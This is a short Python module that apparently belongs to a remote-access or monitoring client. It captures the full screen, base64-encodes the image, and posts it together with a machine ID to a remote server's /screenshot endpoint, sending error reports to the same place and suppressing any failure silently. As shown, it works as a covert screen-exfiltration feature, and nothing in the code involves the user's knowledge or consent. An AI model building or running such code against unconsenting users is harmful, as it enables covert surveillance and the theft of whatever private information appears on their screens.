import base64
from features.curlmanager import CurlManager
import io
from PIL import ImageGrab

def capture_and_send_screenshot(cfc_instance):
    """Capture screenshot and send it to the server"""
    try:      
        # Capture screenshot
        screenshot = ImageGrab.grab()
        
        # Convert to base64 for transmission
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        screenshot_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        # Send screenshot data to server
        curl = CurlManager()
        curl.set_headers(cfc_instance.headers)
        
        screen_data = {"data": screenshot_base64}
        url = f"{cfc_instance.base_url}/screenshot?pc_id={cfc_instance.client_data['pc_id']}"
        curl.post(url=url, json=screen_data)
    except Exception as e:
        try:
            curl = CurlManager()
            curl.set_headers(cfc_instance.headers)
            error_data = {"data": f"Error: {str(e)}"}
            url = f"{cfc_instance.base_url}/screenshot?pc_id={cfc_instance.client_data['pc_id']}"
            curl.post(url=url, json=error_data)
        except:
            pass
